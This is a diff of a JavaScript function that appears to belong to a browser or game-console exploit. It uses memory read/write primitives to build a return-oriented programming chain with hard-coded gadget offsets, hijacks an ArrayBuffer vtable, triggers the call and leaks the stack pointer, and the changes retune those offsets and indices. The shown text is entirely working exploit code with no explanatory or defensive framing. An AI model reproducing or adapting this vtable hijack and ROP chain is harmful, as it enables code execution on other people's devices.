@@ -107,36 +107,28 @@ function write8(addr_low,addr_high,value_low,value_high)
 
 function print_rsp_rop()
 {
-
   oldvtablelow = u32[0x10]
   oldvtablehigh = u32[0x11]
   //rax will point to the beggining of cbuf
-
   //push rsp; jmp qword ptr [rax - 0x2b];
   cbuf[2] = u32[0x10] - 0x79bf0
   cbuf[3] = u32[0x11]
-
   //pop rcx; jmp qword ptr [rax];
   write8(u32[0x14] - 0x2b, u32[0x15], u32[0x10] - 0x4a4cfa,u32[0x11])
-
   // mov qword ptr [rax + 0x18], rcx; ret;
-  cbuf[0] = u32[0x10] - (0x800000 *4) + 0x632de7
+  cbuf[0] = u32[0x10] - 0x17eab23
   cbuf[1] = u32[0x11]
-
   // Redirects vtable
   u32[0x10] = u32[0x14];
   u32[0x11] = u32[0x15];
-
   //trigger vtable call
   cbuf.byteLength;
   debug_log("ROP test completed!")
   // Reset vtable
   u32[0x10] = oldvtablelow;
   u32[0x11] = oldvtablehigh;
-
-  rsp_addr =  new dcodeIO.Long(cbuf[0xC], cbuf[0xD], true)
+  rsp_addr =  new dcodeIO.Long(cbuf[0x6], cbuf[0x7], true)
   debug_log("rsp address = 0x" + rsp_addr.toString(16))
-
 }
 
 function sleep_rop()
